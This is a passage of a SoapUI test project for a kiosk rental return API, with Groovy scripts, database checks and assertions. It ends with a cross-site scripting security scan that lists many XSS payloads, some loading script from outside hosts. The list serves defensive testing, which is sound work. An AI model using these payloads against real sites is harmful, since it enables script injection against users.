4e2-800e-578db9616cc2</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>2541f1eb-0d1a-4584-8ec1-f3a53a02616e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>fd683bb0-82e9-4b17-ba81-0d133272fd8e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>7482ad5c-957f-47b4-b757-a492aefbb406</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="39656bfc-12d8-4d66-a595-9ec3d6014996" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="Return" searchProperties="true" timeout="0" maxResults="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword=""><con:settings/><con:testStep type="manualTestStep" name="Manual" id="8ff1798e-1cb3-423f-8431-fb0ed5b04118" disabled="true"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Run SetDaysBack" id="b4c3ce41-f3b6-4fd7-a8b6-d30b57672257"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status;
def TransactionID = context.expand('${#TestCase#TransactionID}');
def SetDaysBack = context.expand('${#TestCase#SetDaysBack}');
def CustomerProfileNumber = context.expand('${#TestCase#CustomerProfileNumber}');
def Barcode = context.expand('${#TestCase#Barcode}');
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

if ((SetDaysBack == '0') || (SetDaysBack == ''))
{
	log.info ("SetDaysBack: $SetDaysBack; No need to run SetDaysBack Job for TransactionID:$TransactionID &amp; Barcode:[$Barcode]");
}
else
{
	log.info ("SetDaysBack: $SetDaysBack; Run SetDaysBack Job for TransactionID: $TransactionID &amp; Barcode:[$Barcode]");
	sql.execute("exec [dbo].[AutomationSetTransIDCPNumber] $TransactionID,$SetDaysBack,$CustomerProfileNumber");
	
}

//Wait For Collector
def getExtraNightsInfo = sql.firstRow("SELECT DATEDIFF (dd, Rent_Date, GETDATE ()) AS Days FROM [Transaction] WHERE Transaction_ID = $TransactionID");
def numOfDays = getExtraNightsInfo.Days;
log.info ("numOfDays:$numOfDays")
if (numOfDays.toInteger() > 15)
{
	def Integer ConfigIntervalTime = 30000;
	log.info("Non Returns - Waiting for configured time ie: $ConfigIntervalTime milliSeconds");
	sleep(ConfigIntervalTime);
	testRunner.testCase.setPropertyValue("LabelToCheck", "3")
}
else 
{
     log.info("No Non Returns");
     testRunner.testCase.setPropertyValue("LabelToCheck", "2")
}</script></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (Return)" id="5200eef5-be3e-453d-8bc0-1b8784b1f7d2"><con:settings/><con:config><script>def KioskID = context.expand( '${#TestCase#KioskID}');
def Barcode = context.expand( '${#TestCase#Barcode}');
def ReturnType = context.expand( '${#TestCase#ReturnType}');
def FailedSecurityRead = context.expand( '${#TestCase#FailedSecurityRead}');

def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

requestPayload = "";
//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"Return\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"ReturnDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Local\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"ReturnType\": $ReturnType,";
requestPayload += "\"Barcode\": \"$Barcode\",";
requestPayload += "\"Deck\": 1,";
requestPayload += "\"Slot\": 1,";
requestPayload += "\"FailedSecurityRead\": \"$FailedSecurityRead\"";
requestPayload += "}";

// log to soapui log
log.info("Return Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)</script></con:config></con:testStep><con:testStep type="httprequest" name="Return (Request)" id="11df6ba2-fdef-4009-8b25-fefd7880344c"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="6e61d147-27b2-49b8-b8fe-c0fc1958806f" name="Return (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" downloadIncludedResources="false" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="82aaab82-500d-42e1-b926-e5b530056999" name="Check for Success and HasErrors"><con:configuration><scriptText>import groovy.json.JsonSlurper
def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("Return Response: $response")
assert response.contains("\"Success\":true,")
assert response.contains("\"HasErrors\":false,")
def actualTransactionID = context.expand( '${#TestCase#TransactionID}' );
//log.info("AuthResponse:$decodedBody");

/*
 * def list = new JsonSlurper().parseText( response );
def expectedTransactionID = list.get('TransactionId');
//log.info('Transaction_ID = ' + list.get('TransactionId'))
def list = new JsonSlurper().parseText( response );
def actualLabel = context.expand( '${#TestCase#LabelToCheck}' );
if (actualLabel == '3')
{
	assert (actualTransactionID.toString() != expectedTransactionID.toString())
}
else
{
	assert (actualTransactionID.toString() == expectedTransactionID.toString())
}
*/</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="jdbc" name="CheckData" id="854d46d3-f60f-4ce2-9ab5-cb83fda93192"><con:settings><con:setting id="prettyPrintResponse">true</con:setting><con:setting id="discardResponse">false</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select 
Physical_Status
From Disc
Where RF_ID = :Barcode</con:query><con:assertion type="GroovyScriptAssertion" id="85877a9a-6172-4057-b06d-e0910dfd7a1f" name="Script Assertion"><con:configuration><scriptText>def responseAsXml = context.expand( '${CheckData#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/PHYSICAL_STATUS[1]}' )
assert responseAsXml == '2'</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>Barcode</con:name><con:value>${#TestCase#Barcode}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Status" id="28e3f959-7d7b-4430-b733-48889066815d" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	d.Physical_Status,
	d.IsFraud,
	d.Merchand_Status,
	d.Thin_Reason_Code,
	d.Thin_Date,
	t.FormatId
FROM 
	Disc(nolock) d
Inner Join Title t On t.Title_ID = d.Title_ID
WHERE
	d.RF_ID = :RFID</con:query><con:assertion type="GroovyScriptAssertion" id="f0ac0568-e2ed-4a41-a2fb-d4a78628cdad" name="Script Assertion"><con:configuration><scriptText>import com.eviware.soapui.support.XmlHolder
//def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context);
//def discholder = groovyUtils.getXmlHolder("Check Disc Status#ResponseAsXml");
//def actualPhysicalStatus = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/PHYSICAL_STATUS[1]");
//def formatId = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/FORMATID[1]");

//def actualPhysicalStatus = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/PHYSICAL_STATUS[1]}' )
//def formatId = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/FORMATID[1]}' )


//log.info ("actualPhysicalStatus :$actualPhysicalStatus")


//log.info ("formatId:$formatId");


def response = context.expand('${Check Disc Status#ResponseAsXml}')
def holder = new XmlHolder(response)
def actualPhysicalStatus = holder.getNodeValue("//PHYSICAL_STATUS[1]")
assert actualPhysicalStatus == '2'</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="b5301812-7a58-466b-9bf8-c2f4dbfadd9b" name="Script Assertion 2" disabled="true"><con:configuration><scriptText>def actualPhysicalStatus = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/PHYSICAL_STATUS[1]}' );
assert (actualPhysicalStatus = 2);</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>RFID</con:name><con:value>${#TestCase#Barcode}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Transaction" id="79f4ddeb-559a-47cc-ad73-f820e14e740a" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	Return_Date, Return_Client, DaysCharged, DiscTransaction_Status
FROM 
	Disc_Transaction(nolock)
WHERE
	Disc_ID = (select disc_id from disc where RF_ID = :RFID and KioskClient_ID = :KioskId)
and
	transaction_id = :TnxID</con:query><con:assertion type="GroovyScriptAssertion" id="48cf2372-b66f-464f-b19a-61b8729fc1e5" name="DiscTransactionStatus-Validations"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def discholder = groovyUtils.getXmlHolder("Check Disc Transaction#ResponseAsXml");
def discTnxStatus = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/DISCTRANSACTION_STATUS[1]");
def returnDate = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/RETURN_DATE[1]");
def returnType = context.expand( '${#TestCase#ReturnType}' );
log.info("Return Date = $returnDate;Disc Transaction Status = $discTnxStatus")
//Validations
//if(!returnDate.toString().equals("&lt;RETURN_DATE/>"))
if(!returnDate.toString().equals('null'))
{
	assert discTnxStatus =='3'
	/*
	if (returnType == '11')
	{
		//Game Fraud Return
		assert discTnxStatus =='4'
	}
	else
	{
		// returned
		assert discTnxStatus =='3'
	}
	*/		
}
else
{
	//unreturned
	assert discTnxStatus=='4'
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>RFID</con:name><con:value>${#TestCase#Barcode}</con:value></con:property><con:property><con:name>KioskId</con:name><con:value>${#TestCase#KioskID}</con:value></con:property><con:property><con:name>TnxID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="4fe2549a-b8da-434b-9bec-8fe0fd3b3b01" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT top 1 
	i.[Status] AS INVSTATUS,
	ii.[Status] AS INVITEMSTATUS
FROM 
	InvoiceItem ii
INNER JOIN 
	Invoice i
ON 
	i.OID = ii.Invoice
WHERE 
	i.ReferenceNumber = :tnxID
ORDER BY 
	ii.OID DESC</con:query><con:assertion type="GroovyScriptAssertion" id="7747ebe4-283d-4239-8657-3cc084019dc4" name="Invoice and InvoiceItem"><con:configuration><scriptText>def InvoiceID = context.expand( '${#TestCase#InvoiceID}' );
def CardType = context.expand( '${#TestCase#CardType}' ).toInteger();
def IsOffline = context.expand( '${#TestCase#IsOffline}' );
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def discholder = groovyUtils.getXmlHolder("Check Disc Transaction#ResponseAsXml");
def DaysCharged = discholder.getNodeValue("//Results[1]/ResultSet[1]/Row[1]/DAYSCHARGED[1]").toInteger();
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualInvoiceStatus = invholder.getNodeValue("//INVSTATUS[1]").toInteger();
def actualInvoiceItemStatus = invholder.getNodeValue("//INVITEMSTATUS[1]").toInteger();
def RentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def PurchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def getAmountInfo = sql.firstRow("SELECT sum(Quantity * amountbase ) as totalAmountBase FROM	[InvoiceItem] WHERE Invoice = $InvoiceID");
def getTnxAmount = getAmountInfo.totalAmountBase.toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);

if (IsOffline == 'false')
{
	if (getTnxAmount == 0)
	{
		assert (actualInvoiceStatus == 1);
	     assert (actualInvoiceItemStatus == 17);
	}
	else if (getTnxAmount > 0)
	{
		if (DaysCharged > 1)
		{
			assert (actualInvoiceStatus == 1);
	     	assert (actualInvoiceItemStatus == 6);
		}
		else
		{
			assert (actualInvoiceStatus == 1);
	     	assert (actualInvoiceItemStatus == 3);
		}
	}
}
else
{
	if (getTnxAmount == 0)
	{
		assert (actualInvoiceStatus == 4);
	     assert (actualInvoiceItemStatus == 16);
	}
	else if (getTnxAmount > 0)
	{
		assert (actualInvoiceStatus == 1);
     	assert (actualInvoiceItemStatus == 6);
	}
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>tnxID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:setupScript/><con:tearDownScript/><con:properties><con:property><con:name>Barcode</con:name><con:value>001505075</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>20</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>ReturnType</con:name><con:value>6</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149076162</con:value></con:property><con:property><con:name>TransactionID</con:name><con:value>1991328</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22Return%22%2C%22MessageId%22%3A+%2285260379-4581-4cca-b56a-b2d5707056c5%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22ReturnDate%22%3A+%7B%22theDate%22%3A+636818766961230000%2C%22dateTimeKind%22%3A+%22Local%22%2C%22dateString%22%3A+%222018-12-31T12%3A11%3A36.0000123%22%7D%2C%22ReturnType%22%3A+6%2C%22Barcode%22%3A+%22001505075%22%2C%22Deck%22%3A+1%2C%22Slot%22%3A+1%2C%22FailedSecurityRead%22%3A+%22False%22%7D</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90855364928109</con:value></con:property><con:property><con:name>LabelToCheck</con:name><con:value>3</con:value></con:property><con:property><con:name>CardType</con:name><con:value>1</con:value></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>FailedSecurityRead</con:name><con:value>False</con:value></con:property></con:properties><con:reportParameters/><con:securityTest id="48263411-4300-43ef-981d-5b83c38065bb" testCaseId="39656bfc-12d8-4d66-a595-9ec3d6014996" name="SecurityTest 3" failSecurityTestOnScanErrors="true"><con:settings/><con:testStepSecurityTest><con:testStepId>11df6ba2-fdef-4009-8b25-fefd7880344c</con:testStepId><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="ea0d5b85-b96d-44a4-a962-a73e679900b5" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT 